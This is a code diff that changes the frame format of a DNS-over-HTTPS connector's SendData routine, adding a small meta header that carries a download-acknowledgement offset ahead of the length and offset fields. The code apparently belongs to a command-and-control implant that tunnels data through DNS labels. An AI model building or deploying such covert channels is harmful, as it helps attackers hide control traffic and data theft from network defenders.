@@ -28,17 +28,17 @@ typedef struct _DNS_META_V1 {
 	BYTE  version;
 	BYTE  metaFlags;
 	USHORT reserved;
-	ULONG queryTaskId;
+	ULONG downAckOffset; // when metaFlags bit0 is set
 } DNS_META_V1, *PDNS_META_V1;
 #pragma pack(pop)
 
 static void MetaV1Init(DNS_META_V1* h)
 {
 	if (!h) return;
-	h->version     = 1;
-	h->metaFlags   = 0;
-	h->reserved    = 0;
-	h->queryTaskId = 0;
+	h->version       = 1;
+	h->metaFlags     = 0;
+	h->reserved      = 0;
+	h->downAckOffset = 0;
 }
 
 // -----------------------------------------------------------------------------
@@ -1011,17 +1011,25 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
 			if (!frame)
 				return;
-
-			// total_len (big-endian)
-			frame[0] = (BYTE)((total >> 24) & 0xFF);
-			frame[1] = (BYTE)((total >> 16) & 0xFF);
-			frame[2] = (BYTE)((total >> 8) & 0xFF);
-			frame[3] = (BYTE)((total >> 0) & 0xFF);
+			
+			DNS_META_V1 meta;
+			MetaV1Init(&meta);
+			// If we have a meaningful downAckOffset, encode it into MetaHeader V1
+			if (this->downAckOffset > 0) {
+				meta.metaFlags |= 0x01; // bit0 = hasDownAckOffset
+				meta.downAckOffset = this->downAckOffset;
+			}
+			memcpy(frame, &meta, metaSize);
+			// total_len (big-endian) after MetaHeader
+			frame[metaSize + 0] = (BYTE)((total >> 24) & 0xFF);
+			frame[metaSize + 1] = (BYTE)((total >> 16) & 0xFF);
+			frame[metaSize + 2] = (BYTE)((total >> 8) & 0xFF);
+			frame[metaSize + 3] = (BYTE)((total >> 0) & 0xFF);
 			// offset (big-endian)
-			frame[4] = (BYTE)((offset >> 24) & 0xFF);
-			frame[5] = (BYTE)((offset >> 16) & 0xFF);
-			frame[6] = (BYTE)((offset >> 8) & 0xFF);
-			frame[7] = (BYTE)((offset >> 0) & 0xFF);
+			frame[metaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
+			frame[metaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
+			frame[metaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
+			frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
 			memcpy(frame + headerSize, data + offset, chunk);
 
 			memset(dataLabel, 0, sizeof(dataLabel));
